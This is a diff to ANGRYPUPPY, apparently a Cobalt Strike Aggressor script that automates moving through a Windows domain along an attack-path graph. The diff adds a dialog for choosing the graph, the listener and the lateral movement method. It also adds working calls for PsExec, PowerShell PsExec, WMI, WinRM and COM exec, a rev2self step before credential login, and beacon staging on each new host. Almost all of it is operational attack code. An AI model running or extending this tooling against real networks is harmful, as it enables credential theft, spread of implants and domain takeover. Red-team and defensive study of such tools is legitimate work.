@@ -7,7 +7,7 @@
 
 # org.json from https://mvnrepository.com/artifact/org.json/json
 # Documentation - https://stleary.github.io/JSON-java/
-import org.json.* from: {{PATH}};
+import org.json.* from: /Users/vysec/Desktop/Tools/ANGRYPUPPY/json/json.jar;
 include(script_resource("cypher.cna"));
 include(script_resource("utils.cna"));
 
@@ -15,7 +15,7 @@ include(script_resource("utils.cna"));
 
 # Ordered array with attack path in format
 # @(@(%node, relationship), @(%node, relationship), @(%lastnode))
-global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy $machineNo');
+global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy $machineNo $jsonFile $lateralMethod $listenerChoice');
 
 sub parseNodes {
     local('$json');
@@ -216,6 +216,7 @@ sub getToken {
         println("User: " . $user);
         println("Password: " . $password);
 
+        brev2self($currentBid);
         if ($plaintext eq $True){
             println("Using PLAIN TEXT LOGIN");
             bloginuser($currentBid, $domain, $user, $password);
@@ -238,7 +239,23 @@ sub getToken {
 sub lateralMove {
     #PSEXEC here
     if ($psexec eq $False){
-        bpsexec_psh($currentBid, $nextLabel, $listener);
+    	if ($lateralMethod eq "PSEXEC_PSH"){
+        	bpsexec_psh($currentBid, $nextLabel, $listener);
+        }
+        else if ($lateralMethod eq "WMI"){
+        	bwmi($currentBid, $nextLabel, $listener);
+        }
+        else if ($lateralMethod eq "WINRM"){
+        	bwinrm($currentBid, $nextLabel, $listener);
+        }
+        else if ($lateralMethod eq "PSEXEC"){
+        	bpsexec($currentBid, $nextLabel, $listener, "ADMIN\$");
+        }
+        else {
+        	#COMEXEC
+        	com_exec_go($currentBid, $nextLabel, $listener);
+        }
+
         $psexec = $True;
         #bpause($1, 10000);
         bstage($1, $null, $listener);
@@ -358,28 +375,50 @@ sub angryPuppy {
 
     # PROMPT WHAT LISTENER TO USE
 
-    openPayloadHelper(lambda({
-        $listener = $1;
-        $psexec = $False;
-        $mimikatz = $False;
-        @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
+    #openPayloadHelper(lambda({
+    #    $listener = $1;
+    #    $psexec = $False;
+    #    $mimikatz = $False;
+    #    @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
+#
+    #    $rString = "";
+    #    for ($x = 0; $x lt 7; $x++){
+    #        $rString = $rString . rand(@rSet);
+    #    }
+#
+    #    $randomPuppy = "[". $rString . "]";
+#
+    #    # Reset waitFor
+    #    $waitFor = "";
+    #    $machineNo = 0;
+#
+    #    $attackActive = $True;
+    #    elog("[*] ANGRYPUPPY activated: $randomPuppy");
+#
+    #    $pos = 0;
+    #}, $bids => $1));
 
-        $rString = "";
-        for ($x = 0; $x lt 7; $x++){
-            $rString = $rString . rand(@rSet);
-        }
 
-        $randomPuppy = "[". $rString . "]";
+    $listener = $listenerChoice;
+    
+    $psexec = $False;
+    $mimikatz = $False;
+    @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
 
-        # Reset waitFor
-        $waitFor = "";
-        $machineNo = 0;
+    $rString = "";
+    for ($x = 0; $x lt 7; $x++){
+        $rString = $rString . rand(@rSet);
+    }
+    $randomPuppy = "[". $rString . "]";
 
-        $attackActive = $True;
-        elog("[*] ANGRYPUPPY activated: $randomPuppy");
+    # Reset waitFor
+    $waitFor = "";
+    $machineNo = 0;
 
-        $pos = 0;
-    }, $bids => $1));
+    $attackActive = $True;
+    elog("[*] ANGRYPUPPY activated: $randomPuppy");
+
+    $pos = 0;
 }
 
 on heartbeat_1s{
@@ -391,20 +430,47 @@ on heartbeat_1s{
 
 alias angrypuppy {
 
-	prompt_file_open("Choose a JSON file", "graph.json", false, {
-        @final = @();
-        @nodes = @();
-        @edges = @();
-        
-		$path = $1;
-		$path = strrep($path, "\\", "/");
-		$path = strrep($path, "C:", "");
-		println($path);
-		parseGraph($1);
-		angryPuppy();
+	apGUI($1);
+}
 
-	});
+alias angrypuppykill {
+	$attackActive = $False;
+}
 
+sub apGUI {
+	$bid = $1;
+
+
+	$dialog = dialog("ANGRYPUPPY", %(jsonFile => $jsonFile, listenerChoice => $listenerChoice, lateralMethod => $lateralMethod), lambda({
+		# save config
+		$jsonFile = $3['jsonFile'];
+		$listenerChoice = $3['listenerChoice'];
+		$lateralMethod = $3['lateralMethod'];
+
+		if ($2 eq 'Run'){
+			@final = @();
+	        @nodes = @();
+	        @edges = @();
+
+			$path = $jsonFile;
+			$path = strrep($path, "\\", "/");
+			$path = strrep($path, "C:", "");
+			println($path);
+			
+			parseGraph($jsonFile);
+
+			angryPuppy();
+		}
+	}));
+
+	dialog_description($dialog, "Specify the JSON attack path file, listener to use and lateral movement method");
+	drow_file($dialog, "jsonFile", "JSON File: ");
+	drow_listener_stage($dialog, "listenerChoice", "Listener: ");
+	drow_combobox($dialog, "lateralMethod", "Lateral Movement: ", @("PSEXEC_PSH", "WMI", "COMEXEC","WINRM", "PSEXEC"));
+
+	dbutton_action($dialog, "Run");
+	dbutton_action($dialog, "Cancel");
+	dialog_show($dialog);
 }
 
 $True = "True";
